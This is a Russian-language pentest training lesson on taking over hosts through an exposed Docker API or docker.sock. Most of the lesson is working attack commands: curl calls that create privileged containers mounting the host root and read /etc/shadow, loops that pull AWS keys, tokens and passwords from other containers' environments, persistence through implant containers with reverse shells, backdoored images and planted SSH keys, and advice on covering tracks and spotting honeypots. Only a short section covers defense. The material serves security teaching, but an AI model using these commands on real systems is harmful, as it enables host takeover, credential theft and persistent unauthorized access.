---
id: cloud-docker-socket
title: "Открытый Docker socket и API: захват хоста через демон"
category: cloud
parent: cloud-containers-docker
difficulty: hard
order: 3
tags: [cloud, docker, socket, api, 2375, escape, registry]
prerequisites: [cloud-containers-docker]
useful_for:
  - "Эксплуатация открытого Docker API"
  - "Побег через docker.sock"
  - "Пентест контейнерных хостов"
estimated_minutes: 50
summary: "Как обнаружить и использовать открытый Docker socket/API: 2375/2376, TCP и unix-socket, запуск привилегированного контейнера с монтированием корня, извлечение кредов и персистентность."
---

Открытый Docker socket/API — это прямой путь к root на хосте. Демон управляет всеми контейнерами, образами и томами, а также может монтировать произвольные хостовые пути в контейнер. Урок — практический: обнаружение, эксплуатация, извлечение кредов, персистентность.

## Где искать открытый Docker

Три формы доступа:

| Форма | Признак | Доступ |
|-------|---------|--------|
| TCP 2375 | `http://host:2375/version` | Полный, без TLS |
| TCP 2376 | TLS, нужен клиентский сертификат | Часто слабая настройка |
| unix socket | `/var/run/docker.sock` | Полный, локально |

```bash
# Сканирование
nmap -Pn -p 2375,2376 --open <CIDR>
# Проверка
curl -s http://<host>:2375/version
curl -sk https://<host>:2376/version
```

Признаки контейнерных хостов: открытые 2375/2376, 6443 (k8s), 10250 (kubelet), 5000 (registry).

## Эксплуатация через Docker API

API полностью REST-овый. Перечисление:

```bash
BASE=http://<host>:2375
curl -s $BASE/version | jq .
curl -s $BASE/images/json | jq -r '.[].RepoTags[]'
curl -s $BASE/containers/json | jq -r '.[] | .Names[0]'
curl -s $BASE/volumes | jq -r '.Volumes[].Name'
```

Создание и запуск привилегированного контейнера с монтированием корня хоста:

```bash
curl -s -X POST "$BASE/containers/create?name=pwn" \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine",
    "Cmd":["/bin/sh","-c","chroot /host /bin/sh -c \"id; cat /host/etc/shadow\""],
    "Binds":["/:/host"],
    "Privileged":true,
    "HostConfig":{"Binds":["/:/host"],"Privileged":true}
  }'
curl -s -X POST "$BASE/containers/pwn/start"
curl -s "$BASE/containers/pwn/logs?stdout=1&stderr=1"
```

С docker CLI:

```bash
export DOCKER_HOST=tcp://<host>:2375
docker ps
docker run -v /:/host --privileged -it alpine chroot /host /bin/sh
```

## Извлечение кредов из контейнеров

Env и монтирования чужих контейнеров видны через API:

```bash
# Env всех контейнеров
curl -s $BASE/containers/json | jq -r '.[].Id' | while read id; do
  curl -s $BASE/containers/$id/json | jq -r --arg id "$id" \
    '.Config.Env[]? | "\($id) \(.)"'
done | grep -iE 'key|token|pass|secret|aws'

# Монтирования (могут указывать на хостовые секреты)
curl -s $BASE/containers/json | jq -r '.[].Id' | while read id; do
  curl -s $BASE/containers/$id/json | jq -r '.Mounts[]? | .Source + " -> " + .Destination'
done
```

Часто в env — `AWS_*`, `GITHUB_TOKEN`, строки подключения к БД.

## Разобранный пример: открытый 2375 → root на хосте

**Дано:** `10.10.20.7:2375` открыт.

1. Проверяем и перечисляем:

```bash
BASE=http://10.10.20.7:2375
curl -s $BASE/version | jq -r '.Version, .Os, .Arch'
curl -s $BASE/containers/json | jq -r '.[] | .Names[0] + "  " + .Image'
```

2. Находим CI-контейнер с секретами, читаем env (команда выше).
3. Получаем облачные креды, проверяем `aws sts get-caller-identity`.
4. Для полного контроля — запускаем privileged-контейнер, монтирующий `/`, и читаем `/etc/shadow`, `~/.ssh/authorized_keys`, kubeconfig:

```bash
curl -s -X POST "$BASE/containers/create?name=x" -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["sleep","3600"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s -X POST "$BASE/containers/x/start"
curl -s -X POST "$BASE/containers/x/exec" -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/shadow"]}'
```

## Персистентность и заметание следов

- **Контейнер-имплант**: `restart=always`, монтирует `/`, поднимает reverse shell.
- **Новый образ**: `docker commit` контейнера с бэкдором, чтобы вернуться.
- **Том с SSH-ключом**: монтируем `~/.ssh/authorized_keys` хоста.
- **Заметание**: удалять созданные контейнеры/образы, но помнить — Docker events могут логироваться.

```bash
curl -s $BASE/events --max-time 3 | head   # что вообще логируется
```

## Частые ошибки

- **Забыть про `HostConfig`.** В API параметры контейнера идут и в корне, и в `HostConfig` — задавайте в `HostConfig`.
- **Считать 2376 безопасным.** Слабые клиентские сертификаты сводят TLS к нулю.
- **Не смотреть env других контейнеров.** Это самый быстрый источник кредов.
- **Путать `docker.sock` и TCP.** Логика одна, но локальный сокет требует быть внутри контейнера.
- **Оставлять контейнеры.** Имплант надо чистить или маскировать под легитимный.
- **Игнорировать volumes.** В томах лежат данные и секреты.

## Что дальше / решение

- Открыт 2375 → сразу privileged-контейнер с монтированием `/`.
- Внутри контейнера есть `/var/run/docker.sock` → то же, что открытый демон.
- Нужны креды → читайте env/volumes чужих контейнеров.
- Смежные уроки: `cloud-containers-docker`, `cloud-kubernetes-rbac`, `cloud-artifact-registry`.

## API-эндпоинты и curl-примеры

Docker API на 2375 (HTTP) или 2376 (HTTPS). Проверка и эксплуатация:

```bash
curl -s http://TARGET:2375/version
curl -s http://TARGET:2375/containers/json
curl -s http://TARGET:2375/images/json
# запустить контейнер с монтированием корня хоста
curl -s -X POST http://TARGET:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c \"id > /host/tmp/pwn\""],
       "Binds":["/:/host"],"Privileged":true}'
curl -s -X POST http://TARGET:2375/containers/pwn/start
curl -s http://TARGET:2375/containers/pwn/logs?stdout=1
```

## Персистентность через Docker API

| Метод | Как |
|-------|-----|
| Новый контейнер с bind-mount | запуск при рестарте демона |
| Изменение образа (`commit`) | backdoor в образе |
| Cron в хостовом контейнере | регулярный callback |
| SSH-ключ через bind `/root/.ssh` | постоянный доступ |
| Добавление в docker group | доступ к сокету |

## Практическое задание

Разверните Docker с открытым TCP-демоном (`dockerd -H tcp://0.0.0.0:2375`). Через curl перечислите контейнеры, запустите контейнер с bind `/` и прочитайте `/etc/shadow` хоста. Затем закройте демон (только unix-socket) и убедитесь, что доступ пропал. Это базовый навык эксплуатации открытых Docker-демонов.

## Извлечение кредов из контейнеров

Внутри чужих контейнеров часто лежат облачные креды:

```bash
docker ps
docker exec <id> env | grep -iE 'AWS|AZURE|GOOGLE|TOKEN|SECRET'
docker exec <id> cat /root/.aws/credentials
docker exec <id> cat /var/run/secrets/kubernetes.io/serviceaccount/token
docker cp <id>:/app/config.json .
```

Также: `docker inspect <id>` показывает env и mounts; образы (`docker history`, `docker save`) могут содержать секреты в слоях.

## Защита

- Демон только на unix-socket, без `-H tcp://`.
- TLS + клиентские сертификаты, если TCP нужен.
- Не монтировать `docker.sock` в контейнеры.
- Rootless-режим.
- Аудит API-вызовов (`dockerd` логи, auditd).

## Практическое задание 2

Через открытый Docker API найдите контейнер с AWS-креды в env, извлеките их и вызовите `aws sts get-caller-identity`. Оцените, куда ведут эти креды и как далеко можно зайти. Это типичная цепочка «открытый Docker → облачный аккаунт», одна из самых частых находок в облаке.

## Итоговый чек-лист

1. Найти открытый демон (2375/2376, unix-socket в контейнере).
2. Перечислить контейнеры и образы.
3. Запустить контейнер с bind `/` и прочитать хост-ФС.
4. Извлечь облачные креды из env/файлов контейнеров.
5. Закрепиться (SSH-ключ, cron) — аккуратно.
6. Задокументировать и оценить влияние.

## Почему это критично

Открытый Docker-демон — это root на хосте по определению: демон запускает контейнеры от root и может монтировать любые пути. В облаке такие демоны встречаются на self-managed нодах, в CI-раннерах и в dev-инстансах. Найдя порт 2375, вы почти всегда получаете контроль над хостом, а через него — над облачными креды инстанса. Это одна из самых быстрых цепочек «порт → root → аккаунт».

## Определение honeypot

Перед эксплуатацией проверьте, настоящий ли демон: ответ `/version` должен содержать реалистичные `ApiVersion`, `Os`, `KernelVersion`. Honeypot часто отвечает шаблонно и не даёт создать контейнер. Не тратьте время на поддельные цели — подтвердите, что `/containers/create` реально работает.

## Квиз

```quiz
- question: "Какой порт Docker API обычно открыт без TLS?"
  options:
    - "2375"
    - "2376"
    - "5000"
    - "6443"
  answer: 0
  explanation: "2375 — открытый TCP; 2376 — TLS."
- question: "Что нужно задать в Docker API, чтобы смонтировать корень хоста в контейнер?"
  options:
    - "Binds / в HostConfig и, как правило, Privileged"
    - "Только Image"
    - "Только Cmd"
    - "Только name"
  answer: 0
  explanation: "Binds + Privileged дают доступ к хосту."
- question: "Откуда через Docker API проще всего достать облачные креды?"
  options:
    - "Из Config.Env чужих контейнеров"
    - "Из поля Architecture"
    - "Из версии Docker"
    - "Из имени образа"
  answer: 0
  explanation: "Env-переменные видны в inspect."
- question: "Чем Docker socket внутри контейнера эквивалентен открытому демону?"
  options:
    - "Через него можно управлять всеми контейнерами и монтировать хост"
    - "Он только для чтения"
    - "Он шифрует трафик"
    - "Он не даёт прав"
  answer: 0
  explanation: "Сокет = полный контроль над демоном."
- question: "Как обеспечить персистентность через Docker?"
  options:
    - "Контейнер-имплант с restart=always и монтированием хоста"
    - "Сменить цвет темы"
    - "Удалить образы"
    - "Остановить демон"
  answer: 0
  explanation: "Имплант с автозапуском закрепляется на хосте."
```

## Где пригодится

- **Пентест:** захват контейнерных хостов через открытый API.
- **CTF:** контейнерные задачи с escape.
- **Red team:** персистентность и извлечение кредов.
- **Работа:** аудит docker.sock, TLS на 2376, экспозиции API.
- **Дальше по дереву:** `cloud-containers-docker`, `cloud-kubernetes-rbac`.
